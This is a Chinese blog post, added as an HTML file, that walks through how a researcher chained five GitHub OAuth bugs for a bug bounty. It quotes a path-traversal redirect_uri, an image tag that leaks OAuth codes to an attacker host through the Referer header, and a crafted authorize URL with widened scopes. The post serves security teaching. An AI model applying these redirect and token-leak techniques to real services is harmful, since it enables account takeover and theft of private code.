@@ -1,0 +1,92 @@
+<html><body><p><img alt="" class="alignright" height="251" src="../wp-content/uploads/2014/02/Github-Security.png" width="236"/>Egor Homakov（Twitter: <a href="http://twitter.com/homakov">@homakov</a> 个人网站: <a href="http://egorhomakov.com/">EgorHomakov.com</a>）是一个Web安全的布道士，他这两天把github给黑了，并给github报了5个安全方面的bug，他在他的这篇blog——《<a href="http://homakov.blogspot.com/2014/02/how-i-hacked-github-again.html" target="_blank">How I hacked Github again</a>》（墙）说明了这5个安全bug以及他把github黑掉的思路。Egor的这篇文章讲得比较简单，很多地方一笔带过，所以，<strong>我在这里用我的语言给大家阐述一下黑掉Github的思路以及原文中所提到的那5个bug。希望这篇文章能让从事Web开发的同学们警惕</strong>。关于Web开发中的安全事项，大家可以看看这篇文章《<a href="https://coolshell.cn/articles/6043.html" target="_blank" title="Web开发中需要了解的东西">Web开发中的你需要了解的东西</a>》</p>
+<h4>OAuth简介</h4>
+<p>首先，这个故事要从<a href="https://developer.github.com/v3/oauth/" target="_blank">Github OAuth</a>讲起。所以，我们需要先知道什么是<a href="http://en.wikipedia.org/wiki/OAuth" target="_blank">OAuth</a>。所谓OAuth就是说，第三方的应用可以通过你的授权而不用知道你的帐号密码能够访问你在某网站的你自己的数据或功能。像Google, Facebook, Twitter等网站都提供了OAuth服务，提供OAuth服务的网站一般都有很多开放的API，第三方应用会调用这些API来开发他们的应用以让用户拥有更多的功能，但是，当用户在使用这些第三方应用的时候，这些第三方的应用会来访问用户的帐户内的功能和数据，所以，当第三应用要干这些事的时候，我们不能让第三方应用弹出一个对话框来问用户要他的帐号密码，不然第三方的应用就把用户的密码给获取了，所以，OAuth协议会跳转到一个页面，让用户授权给这个第三方应用以某些权限，然后，这个权限授权的记录保存在Google/Facebook/Twitter上，并向第三方应用返回一个授权token，于是第三方的应用通过这个token来操作某用户帐号的功能和数据时，就畅通无阻了。下图简单地说明了Twitter的OAuth的授权过程。</p>
+<p><span id="more-11021"></span></p>
+<p style="text-align: center;"><img alt="" class="aligncenter wp-image-11022" height="375" src="../wp-content/uploads/2014/02/oauth-authentication.png" width="630"/></p>
+<p style="text-align: left;">从上面的流程图中，我们可以看OAuth不管是1.0还是2.0版本都是一个比较复杂的协议，所以，在Server端要把OAuth实现对并不是一些容易事，其总是或多或少会有些小错误。Egor就找到了几个Github的OAuth的实现的问题。</p>
+<h4 style="text-align: left;">OAuth的Callback</h4>
+<p>还需要注意的是，因为OAuth是需要跳到主站的网页上去让用户授权，当用户授权完后，需要跳转回原网页，所以，一般来说，OAuth授权页都会带一个 redirect_url的参数，用于指定跳转回原来的网页。Github使用的这个跳转参数是redirect_uri参数。一般来说，redirect_uri这个参数需要在服务器端进行验证。</p>
+<p>你想一下，如果有人可以控制这个redirect_uri这个参数，那么，你就可以让其跳转到别的网页上（可能会是个有恶意的网页）。如果你觉得跳转到别的网页上也无所谓，那么你就错了。别忘了，当你对这个第三方的应用授权通过后，服务方会给第三方应用返回一个授权token，这个token会被加到那个redirect_uri参数后面然后跳转回去，如果这个redirect_uri被别有用心的人改一个恶意的网址后，这个token也就被转过去了，于是授权token也就被泄漏过去了。</p>
+<p>知道了这一切，我们就可以理解Egor提的那5个bug是什么意思了。</p>
+<h4>第一个Bug — 没有检查重定向URL中的/../</h4>
+<p>首先，我们通过<a href="https://developer.github.com/v3/oauth/#redirect-urls" target="_blank">Github的 redirect_uri 的说明文档</a>我们可以看到这样的说明：</p>
+<pre class="EnlighterJSRAW">如果 CALLBACK URL是: http://example.com/path
+
+GOOD: https://example.com/path
+GOOD: http://example.com/path/subdir/other
+
+BAD: http://example.com/bar
+BAD: http://example.com/
+BAD: http://example.com:8080/path
+BAD: http://oauth.example.com:8080/path
+BAD: http://example.org</pre>
+<p>而Github对于redirect_uri做了限制，要求只能跳回到 https://gist.github.com/auth/github/callback/，也就是说，域名是gist.github.com，目录是/auth/github/callback/，服务器端做了这个限制，看似很安全了。</p>
+<p>但是，Egor发现，Github的服务器端并没有验证.. /../../这样的情况。</p>
+<p>于是，Egor相当于构造了一个下面这样的Redirect URL：</p>
+<pre style="font-size: 10pt;">https://gist.github.com/auth/github/callback/../../../homakov/8820324?code=CODE</pre>
+<p>于是上面的URL就相当于：</p>
+<pre style="font-size: 10pt;">https://gist.github.com/homakov/8820324?code=CODE</pre>
+<p>你可以看到，认证后的跳转网页转到了别的地方去（并非是github限制的地方）——我们知道Github的gist虽然是给你分享代码片段的，但是也可以用来定制自己的东西的（比如markdown），这个gist的网页当然是被Egor所控制的。</p>
+<h4>第二个BUG — 没有校验token</h4>
+<p>第一个bug其实并没有什么，如果服务器端要校验一下token是否和之前生成的token的redirect_uri一模一样，只要服务器做了这个验证，第一个bug完全没有什么用处，但是，github的服务端并没有验证。</p>
+<p>这就是第二个bug，于是第一个和第二个bug组合起来成了一个相当有威力的安全漏洞。</p>
+<p>也就是说，token的生成要考虑redirect_uri，这样，当URL跳转的时候，会把redirect_uri和token带到跳转页面（这里的跳转页面还是github自己的），跳转页面的服务端程序要用redirect_uri来生成一个token，看看是不是和传来的token是一个样的。这就是所谓的对URL进行签名——以保证URL的不被人篡改。一般来说，对URL签名和对签名验证的因子包括，源IP，服务器时间截，session，或是再加个salt什么的。</p>
+<h4>第三个BUG — 注入跨站图片</h4>
+<p>现在，redirect_uri带着code，安全顺利地跳到了Egor构造的网页上：</p>
+<pre>https://gist.github.com/homakov/8820324?code=CODE</pre>
+<p>但是，这个是gist的网页，你无法在这个页面上运行前端（Javascript）或后端程序（Ruby——Github是Ruby做的），现在的问题是我们怎么得到那个code，因为那个code虽然后带到了我的网页上来，但那个网页还是github和用户自己的环境。</p>
+<p>到这里，一般来说，黑客会在这个页面上放一个诸如下面的一个链接，来引诱用户点击，：</p>
+<p>&lt;a href=http://hack.you.com/&gt;私人照片&lt;/a&gt;</p>
+<p>这样，当页面跳转到黑客的网站上来后，你之前的网页上的网址会被加在http头里的 Refere 参数里，这样，我就可以得到你的token了。</p>
+<p>但是，在gist上放个链接还要用户去点一下，这个太影响“用户体验”了，最好能嵌入点外部的东西。gist上可以嵌入外站的图片，但是github的开发人员并非等闲之辈，对于外站的图片，其统统会把这些图片的url代理成github自己的url，所以，你很难搞定。</p>
+<p>不过，我们可以用一个很诡异的技巧：</p>
+<p style="text-align: center;"><b>&lt;img src=”///attackersite.com”&gt;</b></p>
+<p>这个是什么玩意？这个是个URL的相对路径。但是为什么会有三个///呢？呵呵。</p>
+<h5>像程序员一样的思考</h5>
+<p>这个时候，我们需要以“程序员的编程思维”来思考问题——如果你是程序员，你会怎么写校验URL的程序？你一定会想到使用正则表达式，或是用程序来匹配URL中的一些pattern。于是，</p>
+<ul>
+<li>对于绝对路径：你会匹配两个//，后面的可能会是 user@host.com（user@是可选的），然后可能会有:&lt;n&gt;端口号，然后是/，后面是服务器的路径，再往后面应该是?后面带一些参数了。</li>
+</ul>
+<ul>
+<li>对于相对路径：就没有绝对路径那么复杂了。就是些 .. 和 /再加上?和一些参数。</li>
+</ul>
+<p>好了，如果coolshell.cn网页中的&lt;img src=&gt;或&lt;a href=&gt;中用到的相对路径是 /host.com，那么浏览器会解释成：https://coolshell.cn/host.com，如果是///host.com，那么就应该被浏览器解释成 https://coolshell.cn///host.com。</p>
+<p>但是，Chrome和Firefox，会把///host.com当成绝对路径，因为其正确匹配了绝对路径的scheme。如果你正在用Chrome/Firefox看这篇文章 ，你可以看看下面的连接（源码如下）：</p>
+<p style="text-align: center;"><a href="///www.google.com" target="_blank">CoolShell Test</a></p>
+<p><code class="EnlighterJSRAW">&lt;a href="///www.google.com"&gt;CoolShell Test&lt;/a&gt;</code></p>
+<p>关键是，这个Chrome/Firefox的问题被标记成了Won’t Fix，我勒个去，基本上来说，后台的程序也有可能有这样的问题，对于Perl，Python，Ruby，Node.js，PHP带的URL检查的函数库都有这样的问题。</p>
+<p>于是，我们就可以使用这样的方式给gist注入了一个第三方站点的图片（github的服务端没有察觉到（因为我们前面说过大多数语言的URL检查库都会被 Bypass了），但是浏览器端把这个链接解释到了第三方的站点上），于是请求这个图片的http头中的refere 中包含用户当前页面的URL，也包含了用户授权的code。</p>
+<p>到这里，黑客Egor已经拿到用户gist的权限并可以修改或查看用户私用的gist了。但是作者并没有满足，他想要的更多。</p>
+<h4>第四个bug – Gist把github_token放在了cookie里</h4>
+<p>于是Egor在用户的cookie里找到了 github_token</p>
+<p><img alt="" class="aligncenter size-full wp-image-11030" height="47" src="../wp-content/uploads/2014/02/gist_cookie.png" width="395"/></p>
+<p>但是这个token没什么用，因为授权的Scope只有gists。但是，这个token不应该放在用户端的cookie里，本身就是一个安全事故，这个东西只能放在服务端（关于Web开发中的安全事项，可以看看这篇文章《<a href="https://coolshell.cn/articles/6043.html" target="_blank" title="Web开发中需要了解的东西">Web开发中的你需要了解的东西</a>》）。</p>
+<p>于是，Egor只能另谋出路。</p>
+<h4>第五个Bug – 自动给gist授权</h4>
+<p>因为gist是github自家的，Egor所以估计github想做得简单一点，当用户访问gist的时候，不会出弹出一个OAuth的页面来让用户授权，不然，用户就会很诧异，都是你们自家的东西，还要授权？所以，Egor猜测github应该是对gist做了自动授权，于是，Egor搞了这样的一个URL（注意其中的 redirect_uri中的scope ）</p>
+<p style="padding: 10px 20px 20px 30px; background-color: #eee;">https://github.com/login/oauth/authorize?client_id=7e0a3cd836d3e544dbd9&amp;redirect_uri=https%3A%2F%2Fgist.github.com%2Fauth%2Fgithub%<b>2Fcallback/../../../homakov/8820324</b>&amp;response_type=code&amp;<b>scope=repo,gists,user,delete_repo,notifications</b></p>
+<p>于是，这个redirect-uri不但帮黑客拿到了访问gist的token，而且还把授权token的scope扩大到了用户的代码库等其它权限。于是你就可以黑入用户的私有代码区了。</p>
+<h4> 其它 &amp; 感想</h4>
+<p>于是，作者从 <a href="https://bounty.github.com/">Github Security Bug Bounty</a> 拿到了USD $4,000的奖励！Egor一共花了从下午2点到6点一共4个小时找到了这些Bug，平均一小时1000美刀。Egor还很得瑟的说，如果Github请他做安全顾问，他只收一小时USD $400刀，这4个小时也就$1,600。呵呵。大家看看，这是多么有效率的赚钱方式。</p>
+<p>下图是Github上的赏金猎手的排行榜（<a href="https://bounty.github.com/index.html#leaderboard" target="_blank">https://bounty.github.com/index.html#leaderboard</a>）你可以上去挨个看看他们找到的问题，你会发现好些安全问题都很小，有些只能说是不是很规范的问题，Github都赏了几百刀。我查看了一下github的赏金政策，github赏金至少100刀，到5000刀不等。</p>
+<p style="text-align: center;"><img alt="" class="aligncenter wp-image-11053" height="478" src="../wp-content/uploads/2014/02/github_bounty_leaderboard.jpg" width="580"/></p>
+<p>让我们扪心自问一下，我们花了多少时间在玩那些“红包游戏”，而又搞到了多少红包？人家4个小时找了5个bug，挣了$4000美金。<strong>老天给了你我一样的时间，我们用来抽几块钱的红包，人家用自己的技能来挣奖金。这就是人和人的差距。这就是所谓的效率</strong>——你可以移步看看我写的《<a href="https://coolshell.cn/articles/10217.html" target="_blank" title="加班与效率">加班与效率</a>》</p>
+<p>（全文完）<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px; color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+<div class="wp_rp_wrap wp_rp_vertical_m"><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li><a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/19395.html"><img alt="HTTP API 认证授权术" height="150" src="../wp-content/uploads/2019/05/Authorization-360x200-1-150x150.png" width="150"/></a><a class="wp_rp_title" href="https://coolshell.cn/articles/19395.html">HTTP API 认证授权术</a></li><li><a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/18094.html"><img alt="如何免费的让网站启用HTTPS" height="150" src="../wp-content/uploads/2017/08/enable-https-banner-150x150.png" width="150"/></a><a class="wp_rp_title" href="https://coolshell.cn/articles/18094.html">如何免费的让网站启用HTTPS</a></li><li><a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/8711.html"><img alt="程序员疫苗：代码注入" height="150" src="../wp-content/uploads/2012/12/200906020837401710-150x150.jpg" width="150"/></a><a class="wp_rp_title" href="https://coolshell.cn/articles/8711.html">程序员疫苗：代码注入</a></li><li><a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/6043.html"><img alt="Web开发中需要了解的东西" height="150" src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/30.jpg" width="150"/></a><a class="wp_rp_title" href="https://coolshell.cn/articles/6043.html">Web开发中需要了解的东西</a></li><li><a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/5987.html"><img alt="如何设计“找回用户帐号”功能" height="150" src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/12.jpg" width="150"/></a><a class="wp_rp_title" href="https://coolshell.cn/articles/5987.html">如何设计“找回用户帐号”功能</a></li><li><a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/5353.html"><img alt="你会做Web上的用户登录功能吗？" height="150" src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/24.jpg" width="150"/></a><a class="wp_rp_title" href="https://coolshell.cn/articles/5353.html">你会做Web上的用户登录功能吗？</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/11021.html">从“黑掉Github”学Web安全开发</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.</body></html>
